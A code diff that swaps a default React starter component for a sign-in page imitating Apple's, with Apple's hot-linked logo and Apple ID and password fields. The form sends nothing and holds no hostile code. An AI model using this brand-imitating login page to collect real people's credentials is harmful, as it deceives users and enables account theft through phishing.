@@ -1,26 +1,24 @@
 import React from 'react';
-import logo from './logo.svg';
 import './App.css';
 
-function App() {
-  return (
-    <div className="App">
-      <header className="App-header">
-        <img src={logo} className="App-logo" alt="logo" />
-        <p>
-          Edit <code>src/App.tsx</code> and save to reload.
-        </p>
-        <a
-          className="App-link"
-          href="https://reactjs.org"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Learn React
-        </a>
-      </header>
-    </div>
-  );
-}
+const App: React.FC = () => {
+    return (
+        <div className="login-container">
+            <div className="login-box">
+                <img src="https://www.apple.com/ac/structured-data/images/knowledge_graph_logo.png?202306210725" alt="Apple Logo" className="logo"/>
+                <h1>Sign In</h1>
+                <form>
+                    <input type="text" placeholder="Apple ID" className="input-field"/>
+                    <input type="password" placeholder="Password" className="input-field"/>
+                    <button type="submit" className="login-button">Sign In</button>
+                </form>
+                <div className="additional-links">
+                    <a href="#">Forgot Apple ID or password?</a>
+                    <a href="#">Create your Apple ID</a>
+                </div>
+            </div>
+        </div>
+    );
+};
 
 export default App;
